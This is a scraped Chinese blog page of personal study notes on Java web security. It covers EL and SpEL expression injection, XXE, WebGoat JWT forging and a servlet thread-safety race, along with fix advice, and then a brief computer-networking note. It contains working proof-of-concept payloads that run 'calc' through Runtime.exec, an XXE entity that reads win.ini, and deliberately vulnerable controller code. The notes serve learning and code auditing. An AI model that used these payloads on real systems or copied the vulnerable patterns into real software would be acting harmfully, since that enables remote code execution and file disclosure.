<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式实例页面&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">    &lt;h3&gt; 输入的name值为：$&#123;param.name&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;/center&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  $&#123;Runtime.getRuntime().exec(&quot;calc&quot;)&#125;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    @RequestMapping(&quot;/vul&quot;)</span><br><span class="line">    public String vul(String message)&#123;</span><br><span class="line">        /*</span><br><span class="line">        payload</span><br><span class="line">        http://127.0.0.1:8080/vul?message=$&#123;new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]&#123;99,97,108,99&#125;)).start()&#125;</span><br><span class="line">         */</span><br><span class="line">        throw new IllegalArgumentException(message);</span><br><span class="line">    &#125;</span><br><span class="line">    @RequestMapping(&quot;/demo&quot;)</span><br><span class="line">    public String demo(String payload)&#123;</span><br><span class="line">        /*</span><br><span class="line">        http://127.0.0.1:8080/demo?payload=T(Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">         */</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        EvaluationContext evaluationContext = new StandardEvaluationContext();</span><br><span class="line">//        EvaluationContext evaluationContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">        //表达式部分可控</span><br><span class="line">        Expression expression = parser.parseExpression(payload);</span><br><span class="line">        expression.getValue(evaluationContext);</span><br><span class="line">        return &quot;SpELl 注入测试&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">案例FreeMarkerDemo</span><br><span class="line">OFCMS 1.1.3后台Freemarker模板注入</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-4-Xml外部实体注入"><a href="#5-4-Xml外部实体注入" class="headerlink" title="5.4 Xml外部实体注入"></a>5.4 Xml外部实体注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?data=&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">           DocumentBuilderFactory docFactory = DocumentBuilderFactory. newInstance();</span><br><span class="line">           DocumentBuilder docBuilder = docFactory.newDocumentBuilder();</span><br><span class="line">           Document doc = docBuilder.parse(new InputSource(new StringReader(request.getParameter(&quot;data&quot;))));</span><br><span class="line"></span><br><span class="line">           NodeList RegistrationNo = doc.getElementsByTagName(&quot;foo&quot;);</span><br><span class="line">           tmp = RegistrationNo.item(0).getFirstChild().getNodeValue();</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">              out.print(e);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过分析上述代码可知，漏洞成因是该PoC使用了XML解析接口javax. xml.parsers.DocumentBuilder，但却未禁用外部实体。</span><br><span class="line">修复：</span><br><span class="line">	禁用外部实体 如果业务需要引用外部实体须在后端做好参数效验</span><br><span class="line">案例OpenRSAP的testcase</span><br><span class="line">作者的审计 org.jpmml 1.4.4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-2-失效的身份认证"><a href="#5-2-失效的身份认证" class="headerlink" title="5.2 失效的身份认证"></a>5.2 失效的身份认证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">webgoat出于安全只能127.0.0.1:8080端口访问</span><br><span class="line">在火狐中about:config设置network.proxy.allow_hijacking_localhost true</span><br><span class="line">	burp和火狐都设置了12321端口</span><br><span class="line">这样抓本地服务器127.0.0.1上的包了</span><br><span class="line"></span><br><span class="line">jwt token猜解实验</span><br><span class="line">@AssignmentPath(&quot;/JWT/votings&quot;)		/WebGoat目录下/JWT/votings来请求</span><br><span class="line">请求/WebGoat/JWT/votings/login?user=xxx返回构造的jwt 算法是第一部分 claim三个元素第二部分，其中setIssuedAt设置iat时间</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\java安全.assets\image-20230510003152090.png" alt="image-20230510003152090"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://jwt.io可解</span><br><span class="line">获取到jwt后 从代码中获得jwt的密码为victory 修改键值admin为true 重新构造jwt</span><br><span class="line">	在/WebGoat/JWT/votings/reset中利用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\java安全.assets\image-20230510003834007.png" alt="image-20230510003834007"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">还有种解法是构造的jwt的第二个点之后删掉</span><br><span class="line"></span><br><span class="line">效验签名在内置函数DefaultJwtParser.class的Jwt parse函数</span><br><span class="line">	此处断点调试 一个字符一个字符 用.分割每一部分 ...</span><br><span class="line">base64UrlEncodedHeader		第一部分</span><br><span class="line">base64UrlEncodedPayload		第二部分</span><br><span class="line">base64UrlEncodedDigest 		第三部分 签名</span><br><span class="line">下图中第一个判断base64UrlEncodedDigest会进行签名效验 如果它为null就不会进行效验</span><br><span class="line">而第二个判断base64UrlEncodedDigest处给出了它为null的处理 实例的DefaultJwt对象没有签名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\java安全.assets\image-20230510004559936.png" alt="image-20230510004559936"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">其他案例爆破jwt</span><br><span class="line"></span><br><span class="line">防御方式</span><br><span class="line">    * 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</span><br><span class="line">    * 不要使用发送或部署默认的凭证，特别是管理员用户。</span><br><span class="line">    * 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码”（https://github.com/danielmiessler/SecLists/tree/master/Passwords） 列表。</span><br><span class="line">    * 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密（https://pages.nist.gov/800-63-3/sp800-63b.html），或其他现代的基于证据的密码策略相一致。</span><br><span class="line">    * 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</span><br><span class="line">    * 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</span><br><span class="line">    * 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-5-失效的访问控制"><a href="#5-5-失效的访问控制" class="headerlink" title="5.5 失效的访问控制"></a>5.5 失效的访问控制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">身份认证和访问控制(授权)的不同</span><br><span class="line">认证解决who am i 授权 what can i do</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-6-Tomcat任意文件写入"><a href="#5-6-Tomcat任意文件写入" class="headerlink" title="5.6 Tomcat任意文件写入"></a>5.6 Tomcat任意文件写入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-7-跨站脚本"><a href="#5-7-跨站脚本" class="headerlink" title="5.7 跨站脚本"></a>5.7 跨站脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-8-不安全的反序列化"><a href="#5-8-不安全的反序列化" class="headerlink" title="5.8 不安全的反序列化"></a>5.8 不安全的反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-9-使用含有已知漏洞的组件"><a href="#5-9-使用含有已知漏洞的组件" class="headerlink" title="5.9 使用含有已知漏洞的组件"></a>5.9 使用含有已知漏洞的组件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-11-不足的日志记录和监控"><a href="#5-11-不足的日志记录和监控" class="headerlink" title="5.11 不足的日志记录和监控"></a>5.11 不足的日志记录和监控</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-1-CSRF"><a href="#6-1-CSRF" class="headerlink" title="6.1 CSRF"></a>6.1 CSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-2-SSRF"><a href="#6-2-SSRF" class="headerlink" title="6.2 SSRF"></a>6.2 SSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-3-URL跳转"><a href="#6-3-URL跳转" class="headerlink" title="6.3 URL跳转"></a>6.3 URL跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-4-文件操作漏洞"><a href="#6-4-文件操作漏洞" class="headerlink" title="6.4 文件操作漏洞"></a>6.4 文件操作漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-5-Web后门"><a href="#6-5-Web后门" class="headerlink" title="6.5 Web后门"></a>6.5 Web后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-6-逻辑漏洞"><a href="#6-6-逻辑漏洞" class="headerlink" title="6.6 逻辑漏洞"></a>6.6 逻辑漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-7-前端配置不当"><a href="#6-7-前端配置不当" class="headerlink" title="6.7 前端配置不当"></a>6.7 前端配置不当</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-8-拒绝服务"><a href="#6-8-拒绝服务" class="headerlink" title="6.8 拒绝服务"></a>6.8 拒绝服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-9-点击劫持"><a href="#6-9-点击劫持" class="headerlink" title="6.9 点击劫持"></a>6.9 点击劫持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-10-参数污染"><a href="#6-10-参数污染" class="headerlink" title="6.10 参数污染"></a>6.10 参数污染</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-1-SSM框架审计技巧"><a href="#7-1-1-SSM框架审计技巧" class="headerlink" title="7.1.1 SSM框架审计技巧"></a>7.1.1 SSM框架审计技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-2-SSH框架审计技巧"><a href="#7-1-2-SSH框架审计技巧" class="headerlink" title="7.1.2 SSH框架审计技巧"></a>7.1.2 SSH框架审计技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-3-SpringBoot审计流程"><a href="#7-1-3-SpringBoot审计流程" class="headerlink" title="7.1.3 SpringBoot审计流程"></a>7.1.3 SpringBoot审计流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-2-开发框架使用不当范例-Struts远程代码执行"><a href="#7-2-开发框架使用不当范例-Struts远程代码执行" class="headerlink" title="7.2 开发框架使用不当范例(Struts远程代码执行)"></a>7.2 开发框架使用不当范例(Struts远程代码执行)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Y4tacker"><a href="#Y4tacker" class="headerlink" title="Y4tacker"></a>Y4tacker</h1><h3 id="servlet-线程安全"><a href="#servlet-线程安全" class="headerlink" title="servlet 线程安全"></a>servlet 线程安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">创建servlet项目</span><br><span class="line">	https://blog.csdn.net/Faith_cxz/article/details/127685847</span><br><span class="line">	配置maven</span><br><span class="line">	maven-archetype-webapp</span><br><span class="line">servlet线程安全 参考	</span><br><span class="line">	https://y4tacker.github.io/page/5/#content-inner</span><br><span class="line">	https://www.cnblogs.com/chanshuyi/p/5052426.html</span><br><span class="line"></span><br><span class="line">一些结论</span><br><span class="line">	doGet service方法确实共享了成员变量</span><br><span class="line">	python脚本要开两个 我麻了 纠结半天</span><br><span class="line">		url = &quot;http://127.0.0.1:8080/test01/ttt?cmd=ls&quot;</span><br><span class="line">		while 1:</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            if &#x27;Cal&#x27; in r.text:</span><br><span class="line">                print(r.text)</span><br><span class="line">        url = &quot;http://127.0.0.1:8080/test01/ttt?cmd=open -na Calculator&quot;</span><br><span class="line">		while 1:</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            if &#x27;Cal&#x27; in r.text:</span><br><span class="line">                print(r.text)</span><br><span class="line">	前一个是为了使status一直在true，然后每隔2秒(线程延时)就会response返回一个open -na Calculator</span><br><span class="line">static静态变量加上没太大用 	类的属性 类方法调用</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.SingleThreadModel;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/ttt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> status;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        status = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">        System.out.println(status+<span class="string">&quot; if-0 &quot;</span>+Thread.currentThread().getName()+ <span class="string">&quot; &quot;</span> + format.format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>)) &#123;</span><br><span class="line">            status = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(status+<span class="string">&quot; if-1 &quot;</span>+Thread.currentThread().getName()+ <span class="string">&quot; &quot;</span> + format.format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">if</span> (!status) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(status+<span class="string">&quot; if-2 &quot;</span>+Thread.currentThread().getName()+ <span class="string">&quot; &quot;</span> + format.format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        System.out.println(cmd);</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>))&#123;</span><br><span class="line">            System.out.println(cmd);</span><br><span class="line">            resp.getWriter().write(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修复</span><br><span class="line">    1.implements SingleThreadModel 成员变量--&gt;静态变量 		不顶用</span><br><span class="line">		SingleThreadModel接口在Servlet API2.4中将不推荐使用SingleThreadModel</span><br><span class="line">	2.避免使用成员变量 	e.g.把申明类型写道service或doGet方法里面	相当于使用局部变量</span><br><span class="line">	3.使用synchronized关键字 	保证只有一个线程可以访问被保护的区域</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> doGet		在方法前面添加锁</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/java%E5%AE%89%E5%85%A8/" data-id="cljpcwhty0003l8ez4vpo2br8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-计算机网络" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.521Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="002讲-网络-互联网-英特网"><a href="#002讲-网络-互联网-英特网" class="headerlink" title="002讲 网络 互联网 英特网"></a>002讲 网络 互联网 英特网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">网络由若干结点Node和链接这些结点的链路link组成</span><br><span class="line">多个网络可通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互联网，因此，互联网是‘网络的网络’</span><br><span class="line">因特网是世界最大的互联网</span><br><span class="line">internet 和 Internet区别</span><br><span class="line">internet通用名词，泛指由多个计算机互连而成的网络。这些网络之间的通信协议可以是任意的。</span><br><span class="line">Internet则是个专用名词，指当前全球最大的、开放的由众多网络互连而成的特定计算机网络，它由TCP/IP协议族作为通信规则，其前身是美国的ARPANET</span><br><span class="line">ISP英特网服务提供者（Internet Service Provider）</span><br><span class="line">我国的ISP三个运营商</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220817143559646.png" alt="image-20220817143559646"></p>
<h3 id="003讲-电路交换-报文交换-分组交换"><a href="#003讲-电路交换-报文交换-分组交换" class="headerlink" title="003讲 电路交换 报文交换 分组交换"></a>003讲 电路交换 报文交换 分组交换</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220817151508922.png" alt="image-20220817151508922"></h3><h3 id="004讲-计算机网络的定义和分类"><a href="#004讲-计算机网络的定义和分类" class="headerlink" title="004讲 计算机网络的定义和分类"></a>004讲 计算机网络的定义和分类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最简单的定义：一些互相连接的、自治的计算机的集合</span><br><span class="line">较好定义：计算机网络主要由一些通用的、可编程的硬件互连而成，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用。</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220817152523637.png" alt="image-20220817152523637"></p>
<h3 id="007讲-计算机网络体系结构-上"><a href="#007讲-计算机网络体系结构-上" class="headerlink" title="007讲 计算机网络体系结构 上"></a>007讲 计算机网络体系结构 上</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220819000155195.png" alt="image-20220819000155195"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220819000309569.png" alt="image-20220819000309569"></p>
<h3 id="008讲-下"><a href="#008讲-下" class="headerlink" title="008讲 下"></a>008讲 下</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220819000340520.png" alt="image-20220819000340520"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220819001727359.png" alt="image-20220819001727359"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220819001933451.png" alt="image-20220819001933451"></p>
<p><img src="C:\Users\hyy\Desktop\typora_files\hacker学习阶段.assets\image-20220819002036681.png" alt="image-20220819002036681"></p>
<p><img src="C:\Users\hyy\Desktop\typora_files\hacker学习阶段.assets\image-20220819002145778.png" alt="image-20220819002145778"></p>
<h3 id="009讲-计算机网络体系结构-分层思想举例"><a href="#009讲-计算机网络体系结构-分层思想举例" class="headerlink" title="009讲 计算机网络体系结构 分层思想举例"></a>009讲 计算机网络体系结构 分层思想举例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1Y4411U71L?spm_id_from=333.999.0.0&amp;vd_source=d5448e640adeda715972607248810967</span><br></pre></td></tr></table></figure>

<h3 id="012讲-习题"><a href="#012讲-习题" class="headerlink" title="012讲 习题"></a>012讲 习题</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220819154537989.png" alt="image-20220819154537989"></p>
<h3 id="028讲-点对点协议"><a href="#028讲-点对点协议" class="headerlink" title="028讲 点对点协议"></a>028讲 点对点协议</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820192706458.png" alt="image-20220820192706458"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820192606493.png" alt="image-20220820192606493"></p>
<h3 id="033讲-MAC地址"><a href="#033讲-MAC地址" class="headerlink" title="033讲 MAC地址"></a>033讲 MAC地址</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820200237389.png" alt="image-20220820200237389"></p>
